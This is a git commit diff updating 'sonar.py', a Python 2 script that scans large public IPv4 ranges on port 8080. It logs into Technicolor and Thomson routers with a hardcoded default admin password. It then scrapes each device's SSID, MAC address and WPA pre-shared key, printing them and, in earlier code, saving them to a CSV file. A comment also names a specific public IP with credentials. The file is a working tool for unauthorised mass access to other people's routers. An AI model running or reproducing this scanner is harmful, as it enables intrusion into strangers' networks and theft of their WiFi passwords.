22a163a477170f310a678266b9b02426ba50c04f
Eliseo Torres <eliseo.torres95@gmail.com>
2016-06-30 19:10:23 -0500

    Update sonar.py

--- sonar.py
+++ sonar.py
@@ -2,57 +2,85 @@
 import requests
 from requests.auth import HTTPBasicAuth
 from bs4 import BeautifulSoup
-tech=0
-tom=0
-router=open('db.csv','a')
-for i in range(180,202):
-    i=i+1
-    c=str(i)
-    for j in range(51,255):
-        j=j+1
+import socket
+#para cisco r1=requests.get('http://181.59.220.213:8080/wlanBasic.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
+
+tech = 0
+tom = 0
+#181.52.82.215
+router = open('db.csv','a+')
+for i in range(180,256):
+    i = i + 1
+    c = str(i)
+    for j in range(49,256):
+        j = j + 1
         l=str(j)
-        for p in range(0,255):
-            p=p+1
-            m=str(p)
-            for a in range(0,255):
-                a=a+1
-                g=str(a)
-                h=c+"."+l+"."+m+"."+g
+        for p in range(0,256):
+            p = p + 1
+            m = str(p)
+            for a in range(0,256):
+                a = a + 1
+                g = str(a)
+                h = c + "." + l + "." + m + "." + g
                 try:
-                    r1=requests.get('http://'+str(h)+':8080/', timeout=0.3)
-                    head=r1.headers
-                    b='WWW-Authenticate' in head
+                    r1 = requests.get('http://'+str(h)+':8080/', timeout=0.3)
+                    head = r1.headers
+                    b = 'WWW-Authenticate' in head
                     if b==True:
-                        r=requests.get('http://'+h+':8080/', timeout=0.3)
-                        n=r.headers['WWW-Authenticate']=='Basic realm="Technicolor"'
-                        if n: ##Technicolor
-                            tech=tech+1
-                            r2=requests.get('http://'+h+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
-                            parser1=r2.content
-                            bs1=BeautifulSoup(parser1, "html.parser")
-                            for td in bs1.find_all("td", align="middle"):
+                        thom = 'Basic realm="Thomson"'
+                        techni = 'Basic realm="Technicolor"'
+                        
+                        r = requests.get('http://'+h+':8080/', timeout=0.3)
+                        n = r.headers['WWW-Authenticate']
+                        if n == techni: ##Technicolor
+                            tech = tech+1
+                            r2 = requests.get('http://'+h+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
+                            parser1 = r2.content
+                            #name="ServiceSetIdentifier"
+                            bs1 = BeautifulSoup(parser1, "html.parser")
+                            #for name in bs1.find_all("input", {"name":"ServiceSetIdentifier"}):
+                            for name in bs1.find_all("td", align="middle"):
+                                t = name.text[16:]
+                                ma = t[-19:]
+                                mac = ma[1:-1]
+                                ssid = t[0:-19]
+                                
                                 for pwd in bs1.find_all("input", {'name':"WpaPreSharedKey"}):
-                                    #print pwd["value"]
-                                    router.write(h+','+'Technicolor'+','+str(td.text[16:])+','+str(pwd["value"])+','+'\n')
-                                    print str(h)+".....Technicolor......."+td.text[16:]+"....."+pwd["value"]
-                        else: ##Thomson
-                            tom=tom+1
-                            r3=requests.get('http://'+h+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
-                            r4=requests.get('http://'+h+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
-                            parser=r4.content
-                            bs1=BeautifulSoup(parser, "html.parser")
-                            for t in bs1.find_all("td", align='middle'):
+                                    #router.write(h+','+'Technicolor'+','+str(td.text[16:])+','+str(pwd["value"])+','+'\n')
+                                    print h+".....Technicolor..........."+str(mac)+'.......'+str(ssid)+"....."+pwd["value"]
+                        elif n==thom: ##Thomson
+                            tom = tom+1
+                            r3 = requests.get('http://' + h + ':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
+                            r4 = requests.get('http://' + h + ':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
+                            parser = r4.content
+                            bs1 = BeautifulSoup(parser, "html.parser")
+                            
+                            #for n in bs1.find_all("input", {"name":"ServiceSetIdentifier"}):
+                               # print n["value"]
+                            for name in bs1.find_all("td", align="middle"):
+                                t = name.text[16:]
+                                ma = t[-19:]
+                                mac = ma[1:-1]
+                                ssid = t[0:-19]
                                 for pws in bs1.find_all("input", {'name':"WpaPreSharedKey"}):
-                                    router.write(h+','+'Thomson'+','+str(t.text[16:])+','+str(pws["value"])+','+'\n')
-                                    print h+".....Thomson..........."+t.text[16:]+"....."+pws["value"]
-                except requests.exceptions.ConnectTimeout:
-                    pass
-                except requests.exceptions.ReadTimeout:
-                    pass
-                except requests.exceptions.ConnectionError:
+                                    #router.write(h+','+'Thomson'+','+str(t.text[16:])+','+str(pws["value"])+','+'\n')
+                                    print h+".....Thomson..............."+str(mac)+'.......'+str(ssid)+"....."+pws["value"]
+                        
+                                    
+                except requests.exceptions.Timeout:
                     pass
                 except KeyError:
                     pass
+                except socket.timeout:
+                    pass
+                except requests.exceptions.ConnectionError:
+                    pass
+                #except requests.exceptions.ReadTimeout:
+                    #pass
+                #except requests.exceptions.ConnectionError:
+                    #pass
+                #except requests.exceptions.ConnectTimeout:
+                   # pass
 router.close()
 print str(tech)+" technicolor"
 print str(tom)+" tomson"
